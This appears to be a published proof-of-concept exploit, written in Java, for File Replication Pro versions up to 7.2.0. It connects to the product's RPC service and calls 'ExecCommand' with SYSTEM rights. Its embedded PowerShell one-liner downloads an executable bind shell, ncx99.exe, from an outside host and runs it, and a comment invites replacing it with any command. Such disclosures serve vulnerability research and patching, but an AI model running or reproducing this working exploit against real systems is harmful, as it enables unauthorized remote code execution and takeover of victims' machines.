/**
 * @author Jerold Hoong
 * File Replication Pro =< v7.2.0
 * Remote Command Execution + Remote Shell PoC Working Exploit
 */

import java.util.HashMap;
import java.util.Map;
import net.diasoft.frp.engine.model.AddressPort;
import net.diasoft.frp.engine.tcp.client.RPCDriver;
import net.diasoft.frp.engine.tcp.client.TCPConnection;

public class Main {

    // Change this command to whatever fits the target system or whatever you want to achieve
    static String cmd = "powershell.exe (New-Object System.Net.WebClient).DownloadFile(\'http://192.168.56.1:8888/ncx99.exe',\'C:\\\\ncx99.exe\');(New-Object -com Shell.Application).ShellExecute(\'C:\\\\ncx99.exe\');";;

    public static void main(String[] args) {

        String ip, port, password;

        if (args.length < 3) {
            System.out.println("usage: java -cp FRP_Sploit.jar Main <IP> <Port> <Password>");
            System.out.println("e.g. : java -cp FRP_Sploit.jar Main 127.0.0.1 9200 <PwdHashFromConfig.xml>");
            System.out.println("       java -cp FRP_Sploit.jar Main 127.0.0.1 9200 \"\"");
            return;
        }

        if (args.length > 0) {
            ip = args[0];
            port = args[1];
            password = args[2];
        }
        else {
            System.out.println("usage: java -cp FRP_Sploit.jar Main <IP> <Port> <Password>");
            System.out.println("e.g. : java -cp FRP_Sploit.jar Main 127.0.0.1 9200 <PwdHashFromConfig.xml>");
            System.out.println("       java -cp FRP_Sploit.jar Main 127.0.0.1 9200 \"\"");
            return;
        }
        AddressPort ap = new AddressPort(ip, port);
        AddressPort addresses[] = {ap};
        TCPConnection _tcp_connection = null;

        try {
            _tcp_connection = new TCPConnection(addresses, password, true);
            System.out.print("\n[ * ] Connected to " + ip + " as NT AUTHORITY\\SYSTEM\n\n");
            Thread.sleep(3000);

        } catch (Exception e) {
            System.out.println("[ !!! ] Error: " + e.getMessage());
            return;
        }

        RPCDriver rpc = new RPCDriver(_tcp_connection);
        HashMap p = new HashMap();

        try {
            p.put("COMMAND", cmd);
            Map r = rpc.callFunction("ExecCommand", p, false, 0);
            System.out.print("[ * ] Downloaded remote bind shell and executing it on: " + ip + ":99\n\n");
            System.out.print("[ * ] Please be patient ...\n\n");
            Thread.sleep(2000);
            //System.out.println(cmd);

        } catch (Exception e) {
            e.printStackTrace();
            return;
        }

        System.out.println("[ ! ] Please wait a few moments before attempting to connect to " + ip + " on port 99");

        try {
            Thread.sleep(2000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        System.out.print("\n\n---- SHELL SPAWNED ----\n\n");
        //**********************************************************************
    }
}